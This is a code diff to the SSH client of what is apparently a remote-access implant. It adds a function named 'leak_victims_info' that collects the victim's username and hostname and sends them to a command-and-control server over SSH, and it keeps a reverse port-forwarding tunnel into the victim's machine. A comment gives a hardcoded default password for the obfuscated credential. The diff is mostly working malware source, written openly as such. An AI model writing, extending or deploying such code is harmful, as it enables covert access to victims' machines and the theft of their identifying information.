@@ -5,9 +5,9 @@
 #include <libssh/callbacks.h>
 
 #include <stdio.h>
-#include <string.h> 
 #include <thread>
 #include <math.h> 
+#include <algorithm>
 
 #include "client.h"
 #include "global.h"
@@ -15,12 +15,15 @@
 
 #ifdef _WIN32
 #include <Ws2tcpip.h>
+#include <Lmcons.h>
 #define close closesocket
 #define poll WSAPoll
 #else
+#define UNLEN 256
 #include <arpa/inet.h>
 #include <string.h>
 #include <poll.h>
+#include <pwd.h>
 #endif // _WIN32
 
 #ifdef PASSWORD_AUTH
@@ -28,7 +31,7 @@ char  SSHClient::password[30] = {0};
 #endif
 int SSHClient::should_terminate = 0;
 pthread_mutex_t SSHClient::mutex;
-std::vector<std::thread> SSHClient::thread_vector;
+
 
 SSHClient::SSHClient()
 {
@@ -41,7 +44,7 @@ SSHClient::SSHClient()
 
 #ifdef PASSWORD_AUTH
     // default password Tf0!rfrfPOs1
-    strncat(password, OBFUSCATED(PASSWORD_AUTH), sizeof(password)-1);
+    strcat_s(password, OBFUSCATED(PASSWORD_AUTH));
 #endif
 }
 
@@ -196,13 +199,10 @@ int SSHClient::do_remote_forwarding_loop(ssh_session session, ssh_channel channe
     return SSH_OK;
 }
 
-void SSHClient::remote_forwading_thread(ssh_session sess, ssh_channel chan, int lport, pthread_mutex_t* mutex) {
+void SSHClient::remote_forwading_thread(ssh_session sess, ssh_channel chan, int lport, pthread_mutex_t* mutex, std::vector<std::thread*>* thread_vector) {
 	int rc = do_remote_forwarding_loop(sess, chan, lport, mutex);
 	if (rc == SSH_SENT_EOF || rc == SSH_ERROR || rc == SYSTEM_ERROR) {
-		debug("[OTCP] Terminate SSH channel\n");
-		ssh_channel_send_eof(chan);
-		ssh_channel_free(chan);
-		return ;
+		debug("[OTCP] Terminate SSH channel\n");	
 	}
 	else {
 		/* The service has either sent EOF
@@ -210,13 +210,76 @@ void SSHClient::remote_forwading_thread(ssh_session sess, ssh_channel chan, int 
 		   the tunnel is still open.
 		   Accept a new connection. */
 		debug("[DEBUG] Service disconnected. rc = %d\n", rc);
-		ssh_channel_send_eof(chan);
-		debug("[DEBUG] Sent SSH EOF\n");
-		ssh_channel_free(chan);
-		debug("[DEBUG] Freed channel\n");
-		return;
 	}
+    
+
+    pthread_mutex_lock(mutex);
+    for (size_t i = 0; i < thread_vector->size(); i++) {
+        std::thread* th = thread_vector->at(i);
+        if (th->get_id() == std::this_thread::get_id()) {           
+            thread_vector->erase(std::remove(thread_vector->begin(), thread_vector->end(), th), thread_vector->end());
+            th->detach();
+            delete th;
+            break;
+        }
+    }
+    pthread_mutex_unlock(mutex);
+
+    ssh_channel_send_eof(chan);
+    ssh_channel_free(chan);
 }
+
+
+
+int leak_victims_info(ssh_session session)
+{
+#if WIN32
+    
+    char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {NULL};
+    char username[UNLEN + 1] = { NULL };
+#else
+    char hostname[MAXHOSTNAMELEN] = { NULL };
+    char username[LOGIN_NAME_MAX] = { NULL };
+#endif
+    char info[2048] = { NULL };
+    ssh_channel channel;
+    int rc;
+    channel = ssh_channel_new(session);
+    if (channel == NULL)
+        return SSH_ERROR;
+    rc = ssh_channel_open_session(channel);
+    if (rc != SSH_OK)
+    {
+        ssh_channel_free(channel);
+        return rc;
+    }
+
+#if WIN32
+    DWORD bufCharCount = UNLEN + 1;
+    GetUserName(username, &bufCharCount);
+    bufCharCount = MAX_COMPUTERNAME_LENGTH + 1;
+    GetComputerName(hostname, &bufCharCount);
+
+#else
+    gethostname(hostname, sizeof(hostname));
+    getlogin_r(username, sizeof(username));
+#endif // WIN32
+
+    sprintf_s(info, sizeof(info) - 1, "%s$$%s", username, hostname);
+    rc = ssh_channel_request_exec(channel, info);
+    if (rc != SSH_OK)
+    {
+        ssh_channel_close(channel);
+        ssh_channel_free(channel);
+        return rc;
+    }
+    
+    ssh_channel_send_eof(channel);
+    ssh_channel_close(channel);
+    ssh_channel_free(channel);
+    return SSH_OK;
+}
+
 
 
 /* OpenSSH command equivalent:
@@ -228,6 +291,7 @@ void SSHClient::remote_forwading_thread(ssh_session sess, ssh_channel chan, int 
 void SSHClient::do_remote_forwarding(ssh_session sess, int lport, pthread_mutex_t* mutex, std::chrono::time_point<std::chrono::system_clock>* last_keep_alive) {
     debug("[OTCP] Opening port T:%d on server...\n", lport);
     int bounded_port = 0;
+    std::vector<std::thread*> thread_vector;
 #ifdef IS_DEBUG
 	int remote_liste_port = 1234;
 #else
@@ -257,14 +321,7 @@ void SSHClient::do_remote_forwarding(ssh_session sess, int lport, pthread_mutex_
         pthread_mutex_unlock(mutex);
 
         if (chan == NULL) {
-            if(ssh_get_status(sess) == SSH_CLOSED ||
-                ssh_get_status(sess) == SSH_CLOSED_ERROR){
-            //if (!ssh_is_connected(sess)) {
-                auto d = ssh_get_status(sess);
-                auto a = ssh_get_error(sess);
-                auto b = ssh_get_disconnect_message(sess);
-                auto c = ssh_is_connected(sess);
-                debug("%s\n%s\n%d\n", a,b,c);
+            if (!ssh_is_connected(sess)) {
                 goto clean;
             }
 
@@ -278,15 +335,28 @@ void SSHClient::do_remote_forwarding(ssh_session sess, int lport, pthread_mutex_
             }
         }
         debug("\n[OTCP] Connection received\n");
-		std::thread t(SSHClient::remote_forwading_thread, sess, chan, lport, mutex);
-        SSHClient::thread_vector.push_back(std::move(t));
+        
+        // Send victims username and hostname to the C2
+        if (leak_victims_info(sess) != SSH_OK) {
+            debug("Error leaking victim's info\n");
+        }
+
+        std::thread* t = new std::thread(SSHClient::remote_forwading_thread, sess, chan, lport, mutex, &thread_vector);
+        pthread_mutex_lock(mutex);
+        thread_vector.emplace_back(t); // ToDo: mem leak should thread_vector.erase() thread
+        pthread_mutex_unlock(mutex);
     }
 clean:
-    for (std::thread& th : thread_vector){
+    pthread_mutex_lock(mutex);
+    for (auto & th :thread_vector){
         // If thread Object is Joinable then Join that thread.
-        if (th.joinable())
-            th.join();
+        if (th->joinable()){
+            th->join();
+        }
     }
+
+    thread_vector.clear();
+    pthread_mutex_unlock(mutex);
 
     if (ssh_is_connected(sess))
         ssh_disconnect(sess);
